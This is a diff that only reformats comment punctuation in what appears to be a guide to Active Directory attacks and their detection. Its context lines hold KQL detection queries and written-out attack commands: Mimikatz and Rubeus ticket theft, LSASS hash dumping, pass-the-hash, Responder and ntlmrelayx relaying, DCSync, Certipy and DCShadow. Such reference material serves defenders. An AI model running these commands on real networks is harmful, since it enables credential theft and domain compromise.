@@ -256,7 +256,7 @@ This is the primary detection event. Logged on the DC that processed the TGS-REQ
 KQL (Microsoft Sentinel / Log Analytics):
 
 ```kql
-// Kerberoasting detection — RC4 TGS requests for non-computer accounts
+// Kerberoasting detection: RC4 TGS requests for non-computer accounts
 SecurityEvent
 | where EventID == 4769
 | where TicketEncryptionType == "0x17"
@@ -379,7 +379,7 @@ A `Pre-Authentication Type` of `0` is abnormal in virtually all environments and
 KQL query:
 
 ```kql
-// AS-REP Roasting detection — no preauthentication
+// AS-REP Roasting detection: no preauthentication
 SecurityEvent
 | where EventID == 4768
 | where PreAuthType == "0"           // No preauthentication
@@ -452,11 +452,11 @@ Mechanism: Kerberos tickets (TGTs and TGS tickets) are stored in memory by the W
 Extraction tools:
 
 ```
-# Mimikatz — list and export all tickets from current session
+# Mimikatz: list and export all tickets from current session
 mimikatz # sekurlsa::tickets
 mimikatz # sekurlsa::tickets /export     # writes .kirbi files to disk
 
-# Rubeus — list tickets
+# Rubeus: list tickets
 Rubeus.exe triage
 Rubeus.exe dump /service:krbtgt /nowrap  # extract TGT
 
@@ -466,10 +466,10 @@ export KRB5CCNAME=/path/to/ticket.ccache
 
 Injection:
 ```
-# Mimikatz — inject .kirbi ticket
+# Mimikatz: inject .kirbi ticket
 mimikatz # kerberos::ptt ticket.kirbi
 
-# Rubeus — inject from base64 or .kirbi
+# Rubeus: inject from base64 or .kirbi
 Rubeus.exe ptt /ticket:doIFuj...base64...
 ```
 
@@ -574,7 +574,7 @@ Mechanism: NTLM authentication: server sends 8-byte challenge -> client responds
 
 Hash extraction:
 ```
-# Mimikatz — dump from LSASS
+# Mimikatz: dump from LSASS
 mimikatz # sekurlsa::logonpasswords     # requires LSASS debug privilege
 mimikatz # lsadump::lsa /patch          # dumps all hashes from LSA
 
@@ -584,7 +584,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 
 PTH execution:
 ```
-# Mimikatz — open session with hash
+# Mimikatz: open session with hash
 mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<hash> /run:cmd.exe
 
 # Impacket suite
@@ -630,13 +630,13 @@ Tools like Responder poison name resolution to redirect authentication attempts:
 - WPAD (Web Proxy Auto-Discovery): fake proxy autoconfigure response forces NTLM auth
 
 ```bash
-# Responder — listen and poison
+# Responder: listen and poison
 responder -I eth0 -rdw   # LLMNR + NBT-NS + WPAD
 ```
 
 Step 2: Relay
 ```bash
-# ntlmrelayx.py — relay to target
+# ntlmrelayx.py: relay to target
 ntlmrelayx.py -t smb://192.168.1.10 -smb2support         # relay to SMB
 ntlmrelayx.py -t ldap://dc01.corp.local --no-da          # relay to LDAP (add user, etc.)
 ntlmrelayx.py -t mssql://sqlserver.corp.local            # relay to SQL
@@ -698,7 +698,7 @@ Rights required:
 Attack execution:
 
 ```bash
-# Mimikatz — DCSync specific user
+# Mimikatz: DCSync specific user
 mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
 mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
 mimikatz # lsadump::dcsync /domain:corp.local /all /csv    # dump entire domain
@@ -731,7 +731,7 @@ Enabling Event 4662: Requires "Audit Directory Service Access" to be enabled AND
 KQL detection query:
 
 ```kql
-// DCSync detection — non-DC account exercising replication rights
+// DCSync detection: non-DC account exercising replication rights
 SecurityEvent
 | where EventID == 4662
 | where ObjectType contains "19195a5b-6da0-11d0-afd3-00c04fd930c9"   // domainDNS
@@ -801,7 +801,7 @@ Impact: Any domain user can request a certificate claiming to be any other user 
 
 Tooling:
 ```bash
-# Certipy — enumerate vulnerable templates
+# Certipy: enumerate vulnerable templates
 certipy find -u user@corp.local -p pass -dc-ip 192.168.1.10 -vulnerable
 
 # Request certificate with spoofed SAN
@@ -1166,11 +1166,11 @@ Prevention: AGPM (Advanced Group Policy Management) for change control; separate
 Mechanism: DCshadow (mimikatz) registers a rogue Domain Controller in AD and uses legitimate replication mechanisms to push malicious changes to real DCs. Unlike DCSync (which reads), DCshadow writes: it can modify any AD attribute including `sIDHistory`, group memberships, SPN values, or ACLs.
 
 ```
-# Terminal 1 — register rogue DC
+# Terminal 1: register rogue DC
 mimikatz # lsadump::dcshadow /object:CN=attacker,CN=Users,DC=corp,DC=local \
   /attribute:sIDHistory /value:S-1-5-21-...-519
 
-# Terminal 2 — trigger replication push
+# Terminal 2: trigger replication push
 mimikatz # lsadump::dcshadow /push
 ```
 
